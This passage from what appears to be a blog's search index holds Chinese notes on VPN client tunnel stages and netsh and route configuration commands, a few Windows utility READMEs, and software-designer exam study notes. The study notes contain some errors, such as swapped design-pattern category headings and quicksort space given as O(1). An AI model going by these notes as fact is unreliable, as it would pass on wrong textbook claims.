\\&quot;port_max\\&quot;: 80, \\&quot;port_min\\&quot;: 80, \\&quot;protocol\\&quot;: \\&quot;tcp\\&quot;&#125;, &#123;\\&quot;action\\&quot;: \\&quot;redirect\\&quot;, \\&quot;family\\&quot;: \\&quot;ipv4\\&quot;, \\&quot;ip_max\\&quot;: \\&quot;198.18.255.255\\&quot;, \\&quot;ip_min\\&quot;: \\&quot;198.18.0.0\\&quot;, \\&quot;port_max\\&quot;: 65535, \\&quot;port_min\\&quot;: 0, \\&quot;protocol\\&quot;: \\&quot;tcp\\&quot;&#125;, &#123;\\&quot;action\\&quot;: \\&quot;redirect\\&quot;, \\&quot;family\\&quot;: \\&quot;ipv4\\&quot;, \\&quot;ip_max\\&quot;: \\&quot;255.255.255.255\\&quot;, \\&quot;ip_min\\&quot;: \\&quot;0.0.0.0\\&quot;, \\&quot;port_max\\&quot;: 53, \\&quot;port_min\\&quot;: 53, \\&quot;protocol\\&quot;: \\&quot;udp\\&quot;&#125;, &#123;\\&quot;action\\&quot;: \\&quot;redirect\\&quot;, \\&quot;family\\&quot;: \\&quot;ipv6\\&quot;, \\&quot;ip_max\\&quot;: \\&quot;FFFF:FFFF:FFFF:FFFF:FFFF:FFFF:FFFF:FFFF\\&quot;, \\&quot;ip_min\\&quot;: \\&quot;::\\&quot;, \\&quot;port_max\\&quot;: 53, \\&quot;port_min\\&quot;: 53, \\&quot;protocol\\&quot;: \\&quot;udp\\&quot;&#125;]&#125;, \\&quot;data\\&quot;: &#123;\\&quot;block_exclude_lan\\&quot;: 0, \\&quot;block_internet\\&quot;: 0, \\&quot;dns\\&quot;: [], \\&quot;dns4\\&quot;: [], \\&quot;dns6\\&quot;: [], \\&quot;dns_suffix\\&quot;: \\&quot;\\&quot;, \\&quot;ip\\&quot;: \\&quot;1.1.1.29\\&quot;, \\&quot;ipv4\\&quot;: \\&quot;1.1.1.29\\&quot;, \\&quot;mask\\&quot;: \\&quot;255.255.255.255\\&quot;, \\&quot;route_assign4\\&quot;: [], \\&quot;route_assign6\\&quot;: [], \\&quot;route_auto\\&quot;: \\&quot;1\\&quot;, \\&quot;route_includes4\\&quot;: [\\&quot;1.1.1.1/32\\&quot;, \\&quot;10.44.250.130/32\\&quot;, \\&quot;10.44.250.134/32\\&quot;, \\&quot;10.92.2.33/32\\&quot;, \\&quot;198.18.0.0/31\\&quot;, \\&quot;198.18.0.2/32\\&quot;], \\&quot;route_opt\\&quot;: \\&quot;0\\&quot;, \\&quot;vpn_host\\&quot;: \\&quot;10.44.250.133\\&quot;, \\&quot;vpn_ip\\&quot;: \\&quot;10.44.250.133\\&quot;, \\&quot;vpn_ip4\\&quot;: \\&quot;10.44.250.133\\&quot;, \\&quot;vpn_port\\&quot;: \\&quot;443\\&quot;&#125;, \\&quot;errcode\\&quot;: \\&quot;0\\&quot;&#125;&quot;, &quot;routetable&quot;: &quot;[\\&quot;1.1.1.1/32\\&quot;, \\&quot;10.44.250.130/32\\&quot;, \\&quot;10.44.250.134/32\\&quot;, \\&quot;10.92.2.33/32\\&quot;, \\&quot;198.18.0.0/31\\&quot;, \\&quot;198.18.0.2/32\\&quot;]&quot;, &quot;status&quot;: &quot;0&quot; &#125;, &quot;recv&quot;: &#123; &quot;route&quot;: &#123; &quot;status&quot;: &quot;1&quot; &#125; &#125;, &quot;route&quot;: &#123; &quot;message&quot;: &quot;unknown&quot;, &quot;status&quot;: &quot;1&quot; &#125;&#125; 触发nc的操作1234567891011SP_TAP_STAGE_CREATE = 0x00, // CreatedSP_TAP_STAGE_ACCEPT_APP = 0x01, // Accept APP end&#x27;s connection, or connected backend APP server// TODO: more stage for PROXY supports: proxy-connecting proxy-handshakingSP_TAP_STAGE_CONNECT_LOOKUP = 0x02, // DNS lookup, resolving remote hostSP_TAP_STAGE_CONNECT_TCP = 0x03, // connecting remote host by TCPSP_TAP_STAGE_CONNECT_SSL = 0x04, // connecting remote host by SSL or SSL handshaking on exists TCPSP_TAP_STAGE_HANDSHAKE = 0x05, // has connected SSLVPN server authorizingSP_TAP_STAGE_FORWARD = 0x06, // has authorized SSLVPN Server forwarding dataSP_TAP_STAGE_IDLE = 0x07, // has NO L3 services, nc tunnel is not connected, idle state// SP_TAP_STAGE_ERROR = 0x7E,SP_TAP_STAGE_CLOSED = 0x7F 触发 SP_TAP_STAGE_FORWARD 的操作 OnTapAppRead stage!=SP_TAP_STAGE_FORWARD 已认证需要tap数据 SPTapTunnelBypass::OnTapVpnEvent stage&lt;SP_TAP_STAGE_HANDSHAKE 已连接但未认证 SPTapTunnelRelay::OnTapVpnEvent stage== BEV_EVENT_CONNECTED &amp;&amp; stage&lt;SP_TAP_STAGE_HANDSHAKE 已连接但未认证 SPTapTrustTunnelTCP::OnHandshakeRsp接口 errorcode == 0 SPTapTrustTunnelIP::OnHandshakeRsp接口errorcode == 0 SPTapAgent::OnTapVpnRead 隧道建立成功 &amp;&amp; stage==SP_TAP_STAGE_HANDSHAKE SPTapAgent::OnTapVpnRead tag == SP_MSG_VPN_AGT_SESSION_START 会话开始 SPTapAgentHub::OnRspMsgBinary tag==SP_MSG_VPN_AGT_PROXY_AUTH 服务访问授权 SPTapUDPGateway::OnTapAppRead stage&lt;SP_TAP_STAGE_FORWARD SPTapTrustRESTful::OnTapVpnRead stage == SP_TAP_STAGE_HANDSHAKE SPTapTunnelHTTPD::OnTapAppRead stage!=SP_TAP_STAGE_FORWARD SPTapTunnelNC::OnTapVpnRead stage==SP_TAP_STAGE_FORWARD SPTapTunnelMsg::OnTapVpnEvent stage==SP_TAP_STAGE_CONNECT_SSL 测试建议设置网卡 对应下发节点（data节点）： ip 虚拟路由 ipv4 虚拟路由 mask 掩码 vpn_ip 网关 Win7及以后#112netsh interface ip set address 14 static 1.1.1.95 255.255.255.255 store=active# netsh interface ip set address ? # 查看详细帮助 14: 为 “TrusgAgent VNIC” 的索引（此处也可以设置为名称）。 1.1.1.95: 为下发的虚拟ip 255.255.255.255: 为掩码 store: active 时表示设置仅持续到下一次启动；persistent ，设置永久有效 #212netsh interface ip set interface interface=14 metric=1 store=active# netsh interface ip set interface ? #查看帮助 interface: 接口名称或索引 metric: 接口跃点数，已添加到接口上的所有路由的路由跃点数 store: 同【#1】 #31netsh interface ip delete dns 14 all netsh interface ip delete ? 下列指令有效: 此上下文中的命令:delete address - 从指定的接口删除 IP 地址或默认网关。delete arpcache - 刷新一个特定接口或所有接口的 ARP 缓存。delete destinationcache - 删除目标缓存。delete dnsservers - 从指定的接口删除 DNS 服务器。delete excludedportrange - 为连续的端口块删除排除。delete neighbors - 刷新一个特定接口或所有接口的 ARP 缓存。delete route - 删除路由。delete winsservers - 从指定的接口删除 WINS 服务器。 #4添加dns服务武器IP和wins服务器IP 1234# 添加 dns 服务器IPnetsh interface ip add dns 14 %s validate = no# 添加 Wins 服务器IPnetsh interface ip add wins %d %s 其他#11netsh interface ip set address 以太网 dhcp 以太网： 网络名称 dhcp：动态路由 #2通过系统API添加(虚拟ip、目标ip、掩码等） 1DeviceIoControl #3通过系统API设置dns 添加路由 对应下发节点： data &gt; route_includes vnic执行的命令如下所示： 1ADD %ip% MASK %mask% %remoteip% ipv4 ip: 获取配置字段中的vpn_ip，一般为【tap地址】 mask: remotip ipv6 ip: 同【ipv4】 mask: 同 【ipv4】 remoteip:添加ipv6路由时，远端ip为 &quot;20.21.8.20&quot; 删除路由使用 Route Print 查看活动路由 123route DELETE %s MASK %s# 示例：删除[网络目标]为 10.44.250.144,[网络掩码]为 255.255.255.240的条目# route delete 10.44.250.144 mask 255.255.255.240"},{"title":"","date":"2023-10-19T10:10:06.644Z","path":"more/Demo/Visual Studio/Utils/win_str_utills/README.html","text":"Welcome to win_str_utils 👋 windows 字符编码转换相关函数 Author👤 mingming Github: @holdyounger Show your supportGive a ⭐️ if this project helped you! Windows 字符编码转换函数支持的编码转换12345std::string UnicodeToUTF8(const wchar_t* str, int strLen);std::string UnicodeToAnsi(const wchar_t* str, int strLen);std::wstring AnsiToUnicode(const char* str, int strLen);std::string AnsiToUtf8(const std::string&amp; str);std::wstring Utf8ToUnicode(const std::string&amp; str); 文件win_str_utils.hwin_str_utils.cpp This README was generated with ❤️ by readme-md-generator"},{"title":"Windows注册表查询工具","date":"2023-10-16T05:26:00.280Z","path":"more/Demo/Visual Studio/Utils/WinReg/README.html","text":"Welcome to WinReg 👋 windows 注册表查询封装函数 Author👤 mingming Github: @holdyounger Show your supportGive a ⭐️ if this project helped you! Windows 注册表工具用于windows系统查询注册表，具体方法查看代码 文件WinReg.hWinReg.cpp 使用Demo1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162// 遍历网卡std::set&lt;std::string&gt; get_tap_reg()&#123; std::set&lt;std::string&gt; tap_reg; try &#123; WinRegKey reg_key; if (!reg_key.open_exist(HKLM, &quot;SYSTEM\\\\CurrentControlSet\\\\Control\\\\Network\\\\&#123;4D36E972-E325-11CE-BFC1-08002BE10318&#125;&quot;)) &#123; throw(&quot;open regedit %s faild: %s&quot;, _adapter_key, reg_key.get_error_msg()); &#125; vector&lt;string&gt; sub_keys = reg_key.enum_subkeys(); assert(!sub_keys.empty(), &quot;%s has no child keys&quot;); //iterator subkeys for (auto&amp; iter : sub_keys) &#123; char connection_string[256]; sprintf(connection_string, sizeof(connection_string), &quot;%s\\\\%s&quot;, _adapter_key, iter.c_str()); WinRegKey sub_reg_key; if (!sub_reg_key.open_exist(HKLM, connection_string)) &#123; printf(&quot;Open_exist %s failed: %s&quot;, connection_string, sub_reg_key.get_error_msg()); continue; &#125; string component_id; if (!sub_reg_key.read_key_value(&quot;ComponentId&quot;, component_id)) &#123; printf(&quot;Read %s\\\\ComponentId failed: %s&quot;, connection_string, sub_reg_key.get_error_msg()); continue; &#125; string net_cfg_instance_id; if (!sub_reg_key.read_key_value(&quot;NetCfgInstanceId&quot;, net_cfg_instance_id)) &#123; printf(&quot;Read %s\\\\NetCfgInstanceId failed: %s&quot;, connection_string, sub_reg_key.get_error_msg()); continue; &#125; if (strcmp(component_id.c_str(), _component_id) == 0) &#123; tap_reg.insert(net_cfg_instance_id); &#125; &#125; reg_key.~WinRegKey(); return tap_reg; &#125; catch (exception&amp; e) &#123; printf(&quot;%s&quot;, e.what()); return tap_reg; &#125;&#125; This README was generated with ❤️ by readme-md-generator"},{"title":"注册表句柄泄漏定位","date":"2023-10-16T05:26:00.474Z","path":"more/Demo/Visual Studio/WinAPI/句柄泄漏/README.html","text":"句柄查看handle.exe 使用handle 可以查看进程的句柄，直接运行查看系统当前所有的句柄，使用 -p 指定 pid 查询某个进程的句柄 123456789101112131415161718Nthandle v4.22 - Handle viewerCopyright (C) 1997-2019 Mark RussinovichSysinternals - www.sysinternals.comusage: handle [[-a [-l]] [-u] | [-c &lt;handle&gt; [-y]] | [-s]] [-p &lt;process&gt;|&lt;pid&gt;] [name] [-nobanner] -a Dump all handle information. -l Just show pagefile-backed section handles. -c Closes the specified handle (interpreted as a hexadecimal number). You must specify the process by its PID. WARNING: Closing handles can cause application or system instability. -y Don&#x27;t prompt for close handle confirmation. -s Print count of each type of handle open. -u Show the owning user name when searching for handles. -p Dump handles belonging to process (partial name accepted). name Search for handles to objects with &lt;name&gt; (fragment accepted). -nobanner Do not display the startup banner and copyright message.No arguments will dump all file references. 123456789101112131415#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() &#123; string str1 = &quot;hello&quot;; string str2 = &quot;world&quot;; if (str1 == str2) &#123; cout &lt;&lt; &quot;两个字符串相等&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;两个字符串不相等&quot; &lt;&lt; endl; &#125; return 0;&#125;"},{"title":"","date":"2023-10-16T05:25:59.428Z","path":"more/Demo/Python/index.html","text":"Welcome to Python Demo 👋 python 学习及脚本整理 🏠 HomepageAuthor👤 mingming Website: github.com&#x2F;holdyounger Github: @holdyounger Show your supportGive a ⭐️ if this project helped you! 项目介绍 扫描文件夹并展示 扫描和统计代码行数 文本文件编码检测与转换 python socket 客户端python socket 服务端 This README was generated with ❤️ by readme-md-generator"}],"posts":[{"title":"【软件设计师】考前整理","date":"2024-05-11T00:28:48.080Z","path":"B_书籍资料/软件设计师/【软件设计师】考前整理/","text":"概述：软件设计师考前刷题记录 《软件设计师》 未分类 系统总线通常用来连接计算机中的各个部件（如CPU、内存和I&#x2F;O设备）；片内总线连接寄存器和运算器部件；外部总线连接接口和外设、DMA控制器和中断控制器。 程序中用到的是虚拟地址，硬件中访问的通常是物理地址 中断向量提供的是终端服务程序的入口地址或存放中断服务程序的首地址 补码表示的正确项： 补码零的表示是唯一的 可以将减法运算转化为加法运算 符号为可以与数值位一起参加运算 与真值的对应关系不直观 指令流水线的计算方式为 $T &#x3D; \\max_{1 \\leq i \\leq n} { d_i }*n + {1 \\leq i \\leq n}{ d_i }$ 表示层对应用层消息进行压缩、加密 应用层：① 保持应用程序之间建立连接所需要的数据记录，为用户服务；② 确定进程之间通信的性质。 表示层：① 处理通信信号的表示方法，进行不同格式之间的翻译，并负责数据的加解密、数据的压缩与恢复 会话层：① 主要负责两个会话进程之间的通信，即两个会话层实体之间的信息交换和管理数的交换；② 为通信进行建立连接 传输层：端到端的连接。① 向用户提供可靠的端到端的服务，它屏蔽了下层的数据通信细节，让用用户及应用程序不需要考虑实际的通信方法；②主要功能为负责总体的数据传输和数据控制 网络层：分组传输和路由选择。① 主要负责路由、选择合适的路径和进行阻塞控制等功能；② 管理数据通信，实现端到端的数据传送服务，即将数据设法从源端经过若干个中间节点传送到目的端。 数据链路层：传送以帧为单位的信息。① 在两个主机上建立数据链路连接，向物理层传输数据信号，并对信号进行处理使之无差错并合理地传输；② 物理地址寻址、数据的成帧、流量控制、数据的检错和重发等；③ 解决的是所传输数据的准确性的问题，控制网络层与物理层之间的通信。 物理层：二进制传输。 HTTPS加密HTTP消息的方式是会话密钥+对称加密 入侵检测系统一般只做检测，不做防御 软件著作权属于自然人的，该自然人死亡后，在有效期内，继承人只能继承特定权利，不是所有权利，比如署名权就不能继承。 磁盘调度分为移臂调度和旋转调度两类，在移臂调度的算法中，先来先服务和最短寻找时间优先算法可能会随时改变移动臂的运行方向 在磁盘调度管理中，通常先进行移臂调度，再进行旋转调度。在访问不同柱面的信息时，需要先进行移臂调度，之后进行旋转调度。在访问同一磁道的信息时，只需要进行旋转调度。 若磁盘的转速提高一倍，则旋转等待时间减半 线性表采用链表存储结构的特点包括： 所需空间大大小与表长成正比 插入和阐述操作不需要移动元素 无须事先估计存储控件大小 :warning: 不可随机访问表中的任一元素 对采用面向对象方法开发的系统进行测试时，通常从不同层次进行测试。对类中定义的每个方法进行测试属于算法层 在输入条件规定的取值范围的情况下，合理的输入和不合理的输入至少都能执行一次属于黑盒测试 白盒测试原则： 在所有的逻辑判断中，取“真”和取“假”的两种情况至少都能执行一次 程序模块中的所有独立路径至少执行一次 每个循环都应在边界条件和一般条件下个执行一次 管理键盘最适合采用的I&#x2F;O控制方式是中断方式。 哈夫曼树共有127个结点，对其进行哈夫曼编码，共能得到64个字符的编码（求叶子节点的个数） 叶子结点：度为0的节点，与度为2的节点之间存在如下关系：$N0-N2 &#x3D; 1$ 同时 $N0+N2&#x3D;127$ 已知一棵度为3的树寸（一个节点的度是指其子树的数目，树的度是指该树中所有节点的度的最大值）中有5个度为1的节点，4个度为2的节点，2个度为3的节点，那么，该树中的叶子节点数目为9 本题考查数据结构的基础知识设树中的节点总数为n、分支数目为m，那么n&#x3D;5+4+2+叶子节点数，m&#x3D;5X1+4X2+2X3在树中，节点总数等于分支数目加上1，即n&#x3D;m+1,因此，叶子节点数&#x3D;5X1+4X2+2X3+1-5-4-2&#x3D;9 $节点总数&#x3D;分支数目+1$ $分支数目&#x3D; \\sum_{度({i…n})*度为i的节点个数} $ 甘特图： 一种进度管理的工具 易于看出每个子任务的持续时间 易于看出目前项目的实际进度情况 不易于看出子任务之间的衔接关系 在软件系统交付给用户使用后，为了使用户界面更友好，对系统的图形输出进行改进，该行为属于改善型改进 在开发过程中，会引用第三方类。第三方类又会引用其他类。把所有的类封装在一个包中，就能提高开发效率，称为共同重用原则。 C语言中全局变量的存储空间在静态数据区分配。 Java语言符合的特征有采用即时编译、对象在堆空间分配和自动的垃圾回收处理。 确定的有限自动机和不确定的有限自动机：不确定的有限自动机是一个状态到另一个状态的方式有多种，确定的有限自动机是一个状态到另一个状态的方式只有一种。”不确定“是指当前状态的后继状态是不确定的。 脚本语言：主要采用解释方式实现 脚本语言属于动态语言，其程序结构可以在运行中改变 脚本语言一般通过脚本引擎解释执行，不产生独立保存的目标程序 C语言属于静态语言，其所有成分可在编译时确定 编译语言： 执行效率更高 标记语言： 标记语言常用于描述格式化和链接 汇编语言： 汇编语言源程序中的指令语句将被翻译成机器代码 汇编程序以汇编语言源程序为输入，以机器语言表示的目标程序为输出 汇编语言的指令语句必须具有操作码字段，可以没有操作数字段 编译方式 在机器上运行的目标程序完全独立于源程序 运行与源程序等价的目标程序 解释方式 运行时，直接执行源程序或源程序的内部形式 运行程序的控制权在解释程序 不产生独立的目标程序 为了实现多级中断，保存程序现场信息最有效的方法是使用堆栈 完全图适合采用邻接矩阵存储 字符串的长度是指串中所含字符的个数 散列表（哈希表）及其查找特点： 在散列表中进行查找时，需要与哈希桶中所有的关键字进行比较，直到找到与目标关键字相等的元素或者确定目标元素不存在于哈希桶中。 散列表的装填因子越小，发生冲突的可能性就会越小。但是哈希表填装因子过小时，会浪费大量空间，而当装填因子过大时，则会导致冲突的概率增加，影响散列表的性能。 用线性探测法解决冲突可能会产生聚集问题，即出现大量密集的冲突，使得哈希桶中的元素出现聚集。为了避免这种情况，可以采用其他的探测方法，如二次探测、双重散列等。 用链地址法解决冲突可以保证每个桶中只有一个元素时，平均查找长度为1，但是当一个同种有多个元素师，依然需要遍历链表中的所有元素才能找到目标元素，平均查找长度就会增加。 信号量S的取值范围为 资源个数R、进程个数P信号量S的取值范围为： $-(P-R) \\sim R$发生死锁的最小i值为：$R &lt;&#x3D; P*(S-1)+1$ 数据库基本概念：透明 分片透明是指用户或应用程序不需要知道逻辑上访问的表具体是怎么分块存储的 复制透明是指采用复制结束的分步方法，用户不需要知道数据是复制到哪些节点，如何复制的 位置透明是指用户无须知道数据存放的物理位置 逻辑透明即指局部数据模型透明，是指用户或应用程序无须知道局部场地使用的是那种数据模型 常用的中间代码表示有： 树 后缀式 四元式 若了解问题的解空间，并以广度优先的方式搜索解空间，则采用的是分支限界算法策略；以深度优先的方式搜索解空间，则采用回溯算法设计策略。 软件变更控制是变更管理的重要内容，要有效进行变更控制，需要借助配置数据库和基线的概念。配置数据库一般包括开发库、受控库和产品库。 对于大多数通用程序设计语言，用上下文无关文法描述其语法即可。 对高级语言源程序进行编译或解释的过程可以分为多个阶段，解释方式包含： 词法分析 把源程序看做一个线性字符序列进行分析 使用有限自动机（不确定的有限自动机NFA或确定的有限自动机DFA） 语法分析 分析程序中的句子结构是否正确 可以发现程序中所有的语法错误，编译正确的程序必然不包含语法错误 语义分析 语义分析不能发现程序中所有的语义错误，编译正确的程序可能包含语义错误 中间代码生成 中间代码不依赖于具体的机器 使用中间代码可提高编译程序的可移植性 中间代码可以用树或图表示，常见的中间代码有后缀式、三地址式和树等 有利于进行与机器无关的优化处理 目标代码生成 该阶段分配寄存器 与目标机器的体系结构相关 数据库各阶段任务： 需求分析阶段：了解现行系统的概况，确定新系统功能，确定系统边界、收集支持系统目标的基础数据及其处理方法 逻辑设计阶段：对关系模式进一步的规范化处理。部分关系模式的处理、分解、合并或增加冗余属性，提高存储效率和处理效率 程序的三种基本控制结构是顺序、选择和重复。 编写汇编语言程序时，下列寄存器中程序员访问的是程序计数器（PC）。 若一个程序余元可以提供链表的定义和运算，则其运行时的数据空间必须采用堆策略分配存储。 索引节点块、目录块或空闲块，特别是系统目录文件在写回磁盘时发生崩溃，则对系统的影响较大。 表达式采用逆波兰式表示时，利用栈进行求值 设计操作系统时不需要考虑的问题是语言编译器的设计实现 通过元素在存储空间中的相对位置来表示数据元素之间的逻辑关系，是顺序存储的特点 连通无向图的最小生成树种，顶点数恰好比边数多1 哈希表和二叉排序树都可以动态创建，属于动态查找表 顺序查找方法既适用于顺序存储结构，也适用于链表结构 Huffman（哈夫曼）树： 权值越大的叶子离根结点越近 Huffman（哈夫曼）树中不存在只有一个子树的结点 Huffman（哈夫曼）树中的结点总数一定为计数 I&#x2F;O软件隐藏了I&#x2F;O操作实现的细节，方便用户使用I&#x2F;O设备 使用队列对图进行广度优先遍历 管道-过滤器体系结构：一种面向数据流的软件体系结构，主要用于实现复杂的数据多步转换处理 软件构件具有良好的高内聚、低耦合的特点 允许软件设计者将整个系统的输入输出行为看成是多个过滤器的行为的简单合成 支持软件复用&#x2F;重用 系统维护和增强系统性能简单 支持对一些如吞吐量、死锁等属性的分析 支持并行执行 更容易扩展，可以通过添加新的过滤器来添加新的功能 灵活性和可配置型，重新组合过滤器改变系统行为 PHP 更适合用来进行动态网页处理 Huffman（哈夫曼）编码属于熵编码 KMP算法Next数组 12345a b a a b a c a0 1 1 2 2 3 4 1a a a b a a a0 1 2 3 1 2 3 在划分模块时，一个模块的作用范围应该在其控制范围之内。若发现其作用范围不在其控制范围内，则适当的处理方法有： 将判定所在模块合并到父模块中，使判定处于较高层次 将受判定影响的模块下移到控制范围内 将判定上移到层次较高的位置 嵌入式系统初始化过程主要有3个环节，按照自底向上、从硬件到软件的次序依次为 1片级初始化 -&gt; 板级初始化 -&gt; 系统级初始化 片级初始化：完成嵌入式微处理器的初始化，包括设置嵌入式微处理器的核心寄存器和控制寄存器、嵌入式微处理器核心工作模式和嵌入式微处理器的局部总线模式等。片级初始化把嵌入式微处理器从上电时的默认状态逐步设置成系统所要求的工作状态。这是一个纯硬件的初始化过程。 板级初始化：完成嵌入式微处理器以外的其他硬件设备的初始化。另外，还需设置某些软件的数据结构和参数，为随后的系统级初始化和应用程序的运行建立硬件和软件环境。这是一个同事包含软硬件两部分在内的初始化过程。 系统级初始化：以软件初始化为主，主要进行操作系统的初始化。BSP将对嵌入式微处理器的控制权转交给嵌入式操作系统，由操作系统完成余下的初始化操作，包含加载和初始化与硬件无关的设备驱动程序，建立系统内存区，加载并初始化其他系统软件模块，如网络系统、文件系统等。最后，操作系统创还能应用程序环境，并将控制权交给应用程序的入口。 流水线方式执行指令 流水线方式下可同时执行多条指令 流水线方式提高了各部件的利用率 流水线方式提高了系统的吞吐率 主存与Cache的地址映射方式中，全相联方式可以实现主存任意一块装入Cache中任意位置，只有装满才需要替换。 与CPU有关的信息交换都是采用同步传输 Cache(高速缓冲存储器) Cache的内容是主存部分内容的拷贝 Cache的命中率并不随其容量增大线性地提高 Cache位于主存与CPU之间 Cache的设计思想是在合理成本下提高命中率 由硬件自动完成Cache与主存之间的地址映射 PCI总线是并行内总线，SCSI总线是并行外总线 RISC与CISC RISC CISC 指令种类 少、精简 多、复杂 指令复杂度 低（简单） 高（复杂） 指令长度 固定 变化 寻址方式 少 复杂多样 实现（译码）方式 硬布线控制逻辑（组合逻辑控制器） 微程序控制技术 通用寄存器数量 多、大量 一般 支持 支持 执行时长 大多指令在一个时钟周期内完成 闪存： 掉点后信息不会丢失，属于非易失性存储器 以块为单位进行删除操作 在嵌入式系统中可以用 Flash 来代替 ROM存储器 采用总线结构的优点： 简化系统结构，便于系统设计制造 大大减少了连接数目，便于布线，减小体积，提高系统的可靠性 便于接口设计，所有总线连接的设备均采用类似的接口 便于系统的扩充、更新与灵活配置，易于实现系统的模块化 便于设备的软件设计，所有接口的软件就是对不同的口地址进行操作 便于诊断和维修，同时降低了成本 总线复用方式可以减少总线中信号线的数量 常用的虚拟存储器由主存-辅存两级存储器组成。 指令寄存器的位数取决于指令字长 指令系统中采用不同寻址方式的目的是扩大寻址空间并提高编程灵活性 若某计算机系统的I&#x2F;O接口与主存采用统一编址，则输入输出操作是通过访存指令来完成的。 CPU需要与外设进行数据交换，采用中断方式和DMA方式控制技术时，CPU与外设可并行工作 系统总线：ISA、EISA、PCI SRAM与DRAMDRAM（动态随机存储器）构成主存，DRAM需要周期性的刷新保持信息SRAM（静态随机存储器）构成Cache SRAM DRAM 原理 触发器 电容 读出 非破坏性 破坏性 刷新 不用 用 送地址 一起送 行列分开送 速度 快 慢 集成度 低 高 功耗 高 低 高 低 Cache 内存 闪存可以理解为U盘，故断电后信息不回丢失。闪存是以块为单位进行删除的。 闪存是EPROM的一种类型 数据库的安全机制中，通过提供存储过程供第三方开发人员调用进行数据更新，从而保证数据库的关系模式不被第三方所获取。 算法使用场景 算法使用场景 分数背包 贪心算法 0-1背包 动态规划 旅行商 暴力搜索 最长公共子序列 动态规划 排序算法 【算法】排序算法之基数排序 - 知乎 时间复杂度 空间复杂度 冒泡排序 从前往后依次两两进行比较，如果符合条件则调换 简单选择排序 从列表中依次选择第n小的替换到对应的位置 折半查找 是一个分支算法只能应用于有序表若表长为n，则时间复杂度为$O(\\log n)$ 直接插入排序 排序过程中，每次从无序表中取出第一个元素，将其插入到有序表中的适当位置，使有序表的长度不断加长。 O(n) O(1) 快速排序 最好：O(nlgn)最坏：O(N^2^) O(1) 归并排序 分组然后合并 最好与最坏情况都是O(nlgn) UML用例图 图 作用 用例图Use Case Diagram 用例图用于描述系统外部的各类执行者与系统提供的各种用例之间的关系，展示了系统的功能需求。他说明了谁要使用系统，以及他们使用该系统可以做些什么 类图Class Diagram 类图描述系统中类的静态结构，以及各个类之间的关系。它展示了类的属性、方法以及他们之间的继承、关联、聚合等关系 对象图Object Diagram 对象图是类图的一种实例化图，描述了系统中的对个对象在某一时刻的状态。他是类图的动态实例。 包图Package Diagram 包图对构成系统的模型元素进行分组整理，表示包与包之间的关系，描述系统的分层结构。① 可以拥有类、接口构建、节点；② 一个包可以嵌套其他包；③ 一个包类元素不能重名 活动图Activity Diagram 活动图描述了业务实现用例的工作流程，展示了从一个活动到另一个活动的控制流 状态图State Diagram 状态图是描述状态到状态控制流的图，常用语动态特性建模。它展示了对象在其声明周期中的不同状态以及状态之间的转换。 顺序图Sequence Diagram 描述多个对象之间按顺序调用情况 协作图Collaboration Diagram（通信图） 描述了对象之间的协助关系，展示了对象之间的消息传递和交互 构件图Component Diagram 一种特殊的UML图，用于描述系统的静态实现视图，展示系统中的软件和硬件组件以及他们之间的依赖关系 部署图Deployment Diagram 部署图定义系统中软硬件的物理体系结构，展示了硬件节点、软件组件以及它们之间的部署关系。 用例图之间的关系 泛化关系这是一种继承关系，子用例是父用例的一种特殊形式，它继承了父用例的所有结构、行为、关系。在图形表示中，三角箭头指向父用例。 包含关系 一个用例的行为包含了另一个用例的行为。当执行基用例是，每次都必须调用被包含用例。被包含用例也可以单独执行。 扩展关系扩展用例在扩展点上增加新的维护和含义。扩展用例为基用例添加新的行为，箭头指向基用例。这种关系允许基用例的行为在特定条件下被扩展用例所添加的行为所修改或增强。 数据库 数据库的对应关系 表现 三级模式 视图 基本表 模式 概念视图 存储文件 内模式（只有一个） 内部视图 视图 外模式（可以有多个） 用户视图 两级映像 模式&#x2F;内模式映像 物理独立性 外模式&#x2F;模式映像 逻辑独立性 数据库的三级模式 模式 描述 概念模式 概念模式是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图。一个数据库只有一个概念模式。 外模式 外模式（子模式、用户模式）用以描述用户看到或使用的哪部分数据的逻辑结构，用户根据外模式用数据操作语句或应用程序去操作数据库中的数据 内模式 内模式定义的是存储记录的类型、存储域的表示以及存储记录的物理顺序，指引元、索引和存储路径等数据的存储组织。一个数据库只有一个内模式 4类故障 事务内部故障。事务内部的故障有的可以通过事务程序本身发现。但有些是非预期的，不能由事务程序处理，例如运算溢出、并发事务发生死锁等 系统故障。通常称为软故障，是指造成系统停止运行的任何事件，使得系统要重新启动。 介质破坏。通常称为硬故障，如磁盘损坏、磁头碰撞和瞬时强磁干扰。此类故障发生的几率小，但破坏性最大。 计算机病毒。 三大范式 1NF。数据库表的每一列都是不可分割的原子项。避免数据冗余和混淆。 例如：不能在“姓名”列中同时存储一个人的姓换和名，而应该拆分为”姓“和”名”。 2NF。除了主键以外，其他字段都必须依赖于主键。 例如：在一个订单表中，订单号（主键）与订单详情、客户信息等字段都有关联。但客户信息不应该直接存储在订单表中，而应该单独建立一个客户表，并通过订单号与客户ID进行关联。 3NF。在满足第二范式的基础上。3NF 要求飞逐渐字段之间不存在传递依赖关系，也就是说，一个非主键字段不能依赖于另一个非主键字段。 例如：在一个员工表中，员工号（主键）与姓名、部门号等字段都有关联。但部门号（非主键）不应该与部门名称（非主键）直接关联，而应该通过部门号与部门表进行关联。 连接 设计模式创建型 工厂方法Factory Method 定义一个用于创建对象的接口，让子类决定实例化哪一个类 抽象工厂Acstract Factory 提供一个创建一系列相关或相互依赖对象的接口，而无须指定他们具体的类 生成器Builder 将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示 原型Prototype 用原型实例指定创建对象的种类，并且通过复制这些原型创建新的对象 单例Singleton 保证一个类仅有一个实例，并提供一个访问它的全局访问点 行为型 适配器Adapter 将一个类的接口转换成客户希望的另一个接口 桥接Bridge 将抽象部分与其实现部分分离，使它们都可以独立的变化 组合Composite 将对象组合成树形结构以表示“部分-整体”的层次结构 装饰Decorator 动态地给一个对象添加一些额外的职责 外观Facade 为子系统中的一组结构提供一个一致的界面，Facade模式定义了一个高层接口，这个接口使得这一子系统更加容易使用 享元FlyWeight 运用共享技术有效地支持大量细粒度的对象 代理Proxy 为其他对象提供一种代理以控制对这个对象的访问 结构型 责任链Chain of Responsibility 十多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系 命令Command 